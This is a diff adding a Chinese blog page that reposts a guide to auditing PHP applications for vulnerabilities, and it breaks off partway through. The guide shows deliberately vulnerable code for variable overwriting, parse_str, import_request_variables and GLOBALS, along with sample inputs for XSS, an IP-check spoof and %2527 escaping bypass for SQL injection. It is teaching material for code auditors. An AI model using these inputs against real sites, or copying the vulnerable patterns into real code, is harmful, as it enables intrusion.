@@ -1,0 +1,1778 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="ZEROYU, SEC" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ZEROYU" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="高级PHP应用程序漏洞审核技术Summary Php Application Source Code Audits Advanced Technology - Simplified Chinese
+前言PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[转载]高级PHP应用程序漏洞审核技术">
+<meta property="og:url" content="http://zer0yu.github.io/2017/10/31/转载-高级PHP应用程序漏洞审核技术/index.html">
+<meta property="og:site_name" content="ZEROYU">
+<meta property="og:description" content="高级PHP应用程序漏洞审核技术Summary Php Application Source Code Audits Advanced Technology - Simplified Chinese
+前言PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。">
+<meta property="og:updated_time" content="2017-10-31T11:09:31.700Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[转载]高级PHP应用程序漏洞审核技术">
+<meta name="twitter:description" content="高级PHP应用程序漏洞审核技术Summary Php Application Source Code Audits Advanced Technology - Simplified Chinese
+前言PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://zer0yu.github.io/2017/10/31/转载-高级PHP应用程序漏洞审核技术/"/>
+
+
+
+
+
+  <title> [转载]高级PHP应用程序漏洞审核技术 | ZEROYU </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?414e74bab07e7101a26a8ca95416288a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">ZEROYU</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/31/转载-高级PHP应用程序漏洞审核技术/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                [转载]高级PHP应用程序漏洞审核技术
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-31T19:08:46+08:00">
+                2017-10-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/10/31/转载-高级PHP应用程序漏洞审核技术/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/31/转载-高级PHP应用程序漏洞审核技术/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/10/31/转载-高级PHP应用程序漏洞审核技术/" class="leancloud_visitors" data-flag-title="[转载]高级PHP应用程序漏洞审核技术">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="高级PHP应用程序漏洞审核技术"><a href="#高级PHP应用程序漏洞审核技术" class="headerlink" title="高级PHP应用程序漏洞审核技术"></a>高级PHP应用程序漏洞审核技术</h2><p>Summary Php Application Source Code Audits Advanced Technology - Simplified Chinese</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。</p>
+<p>随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。</p>
+<p>也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。</p>
+<p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）</p>
+<h3 id="传统的代码审计技术"><a href="#传统的代码审计技术" class="headerlink" title="传统的代码审计技术"></a>传统的代码审计技术</h3><p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p>
+<p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p>
+<p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。</p>
+<h3 id="PHP版本与应用代码审计"><a href="#PHP版本与应用代码审计" class="headerlink" title="PHP版本与应用代码审计"></a>PHP版本与应用代码审计</h3><p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">版本</th>
+<th style="text-align:left">占比</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">php4</td>
+<td style="text-align:left">68%</td>
+<td style="text-align:left">2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</td>
+</tr>
+<tr>
+<td style="text-align:left">php5</td>
+<td style="text-align:left">32%</td>
+<td style="text-align:left">2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</td>
+</tr>
+<tr>
+<td style="text-align:left">php6</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc</td>
+</tr>
+</tbody>
+</table>
+<p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p>
+<h3 id="其他的因素与应用代码审计"><a href="#其他的因素与应用代码审计" class="headerlink" title="其他的因素与应用代码审计"></a>其他的因素与应用代码审计</h3><p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/<code>*</code>nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p>
+<p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。</p>
+<h3 id="扩展我们的字典"><a href="#扩展我们的字典" class="headerlink" title="扩展我们的字典"></a>扩展我们的字典</h3><p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p>
+<h3 id="变量本身的key"><a href="#变量本身的key" class="headerlink" title="变量本身的key"></a>变量本身的key</h3><hr>
+<p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></div><div class="line"><span class="comment">//print_R($_GET); </span></div><div class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">print</span> $key.<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</div></pre></td></tr></table></figure>
+<p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） </p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求 : 无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求 : 无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略 : 通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><hr>
+<p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p>
+<h3 id="遍历初始化变量"><a href="#遍历初始化变量" class="headerlink" title="遍历初始化变量"></a>遍历初始化变量</h3><p>请看如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//var.php?a=fuck</span></div><div class="line">$a=<span class="string">'hi'</span>;</div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">	$$key = $value;</div><div class="line">&#125;</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$chs = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>) &#123;</div><div class="line">	$chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);</div><div class="line">	<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">		$$key = $chs-&gt;Convert($value);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">unset</span>($chs);</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="parse-str-变量覆盖漏洞"><a href="#parse-str-变量覆盖漏洞" class="headerlink" title="parse_str()变量覆盖漏洞"></a>parse_str()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=new</span></div><div class="line">$var = <span class="string">'init'</span>;                     </div><div class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]); </div><div class="line"><span class="keyword">print</span> $var;</div></pre></td></tr></table></figure>
+<p>该函数一样可以覆盖数组变量，上面的代码是通过$<code>_</code>SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=1&amp;a[1]=var1%3d222</span></div><div class="line">$var1 = <span class="string">'init'</span>;</div><div class="line">parse_str($a[$_GET[<span class="string">'var'</span>]]);</div><div class="line"><span class="keyword">print</span> $var1;</div></pre></td></tr></table></figure>
+<p>上面的代码通过提交$var来实现对$var1的覆盖。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略（parse_str）</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符parse_str</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略（mb_parse_str）</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符mb_parse_str</td>
+</tr>
+</tbody>
+</table>
+<h3 id="import-request-variables-变量覆盖漏洞"><a href="#import-request-variables-变量覆盖漏洞" class="headerlink" title="import_request_variables()变量覆盖漏洞"></a>import_request_variables()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'GLOBALS '</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"n"</span>;</div><div class="line">import_request_variables(<span class="string">'GPC'</span>);</div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'10.1.1.1'</span>) <span class="keyword">die</span>(<span class="string">'Go away!'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'Hello admin!'</span>;</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略（import_request_variables）</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符import_request_variables</td>
+</tr>
+</tbody>
+</table>
+<h3 id="PHP5-Globals"><a href="#PHP5-Globals" class="headerlink" title="PHP5 Globals"></a>PHP5 Globals</h3><p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//register_globals = &apos;ON&apos;</div><div class="line">//foo.php?GLOBALS[foobar]=HELLO</div><div class="line">echo $foobar; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>但是很多的程序没有考虑到这点，请看如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//为了安全取消全局变量</span></div><div class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></div><div class="line"><span class="keyword">if</span> (ini_get(<span class="string">'register_globals'</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="keyword">print</span> $_GET[b];</div></pre></td></tr></table></figure>
+<p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<h3 id="magic-quotes-gpc与代码安全"><a href="#magic-quotes-gpc与代码安全" class="headerlink" title="magic_quotes_gpc与代码安全"></a>magic_quotes_gpc与代码安全</h3><hr>
+<h3 id="什么是magic-quotes-gpc"><a href="#什么是magic-quotes-gpc" class="headerlink" title="什么是magic_quotes_gpc"></a>什么是magic_quotes_gpc</h3><p>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p>
+<h3 id="哪些地方没有魔术引号的保护"><a href="#哪些地方没有魔术引号的保护" class="headerlink" title="哪些地方没有魔术引号的保护"></a>哪些地方没有魔术引号的保护</h3><p><em>1) $<code>_</code>SERVER变量</em></p>
+<p>PHP5的$<code>_</code>SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略（$<code>_</code>SERVER变量）</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符<code>_</code>SERVER</td>
+</tr>
+</tbody>
+</table>
+<p><em>2) getenv()得到的变量（使用类似$<code>_</code>SERVER变量）</em></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略（getenv()）</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符getenv</td>
+</tr>
+</tbody>
+</table>
+<p><em>3) $HTTP_RAW_POST_DATA与PHP输入、输出流</em></p>
+<p>主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</div><div class="line">	$HTTP_RAW_POST_DATA = file_get_contents( <span class="string">'php://input'</span> );</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($HTTP_RAW_POST_DATA) )</div><div class="line">	$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略（数据流）</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找字符HTTP_RAW_POST_DATA或者php://input</td>
+</tr>
+</tbody>
+</table>
+<p><em>4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by</em></p>
+<p>如Discuz!&lt;5.0的pm.php：<br>​     </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if(is_array($msgtobuddys)) &#123;</div><div class="line">	$msgto = array_merge($msgtobuddys, array($msgtoid));</div><div class="line">		......</div><div class="line">foreach($msgto as $uid) &#123;</div><div class="line">	$uids .= $comma.$uid;</div><div class="line">	$comma = ',';</div><div class="line">&#125;</div><div class="line">......</div><div class="line">$query = $db-&gt;query("SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</div><div class="line">	LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</div><div class="line">	WHERE m.uid IN ($uids)");</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找数据库操作字符（select,update,insert等等）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="变量的编码与解码"><a href="#变量的编码与解码" class="headerlink" title="变量的编码与解码"></a>变量的编码与解码</h3><p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。</p>
+<p>这个类型的主要函数有：</p>
+<p><em>1) stripslashes() 这个其实就是一个decode-addslashes()</em></p>
+<p><em>2) 其他字符串转换函数：</em></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">base64_decode</td>
+<td style="text-align:left">对使用 MIME base64 编码的数据进行解码</td>
+</tr>
+<tr>
+<td style="text-align:left">base64_encode</td>
+<td style="text-align:left">使用 MIME base64 对数据进行编码</td>
+</tr>
+<tr>
+<td style="text-align:left">rawurldecode</td>
+<td style="text-align:left">对已编码的 URL 字符串进行解码</td>
+</tr>
+<tr>
+<td style="text-align:left">rawurlencode</td>
+<td style="text-align:left">按照 RFC 1738 对 URL 进行编码</td>
+</tr>
+<tr>
+<td style="text-align:left">urldecode</td>
+<td style="text-align:left">解码已编码的 URL 字符串</td>
+</tr>
+<tr>
+<td style="text-align:left">urlencode</td>
+<td style="text-align:left">编码 URL 字符串</td>
+</tr>
+</tbody>
+</table>
+<p><em>另外一个 unserialize/serialize</em></p>
+<p><em>3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等</em></p>
+<p>目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"SELECT * FROM article WHERE articleid='"</span>.urldecode($_GET[id]).<span class="string">"'"</span>;</div></pre></td></tr></table></figure>
+<p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM article WHERE articleid=<span class="string">''</span><span class="string">'</span></div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
